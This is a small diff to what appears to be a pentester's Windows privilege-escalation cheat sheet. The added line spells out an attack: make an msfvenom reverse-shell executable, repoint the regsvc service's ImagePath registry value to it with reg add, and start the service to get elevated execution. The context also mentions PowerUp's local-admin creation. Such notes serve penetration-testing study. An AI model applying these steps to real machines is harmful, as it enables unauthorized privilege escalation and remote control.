@@ -693,7 +693,7 @@ Or use `Write-UserAddMSI` of PowerUp to create local admin.
 
 Check with `Get-Acl -Path HKLM:\System\CurrentControlSet\services\regsvc |fl` if current user has `FullControl` on registry key.  
 
-todo  
+If so, make .exe reverse shell with msfvenom and change the registry key with `reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\path\rev.exe /f` and start service with `sc start regsvc`.  
 
 ## Get shells
 
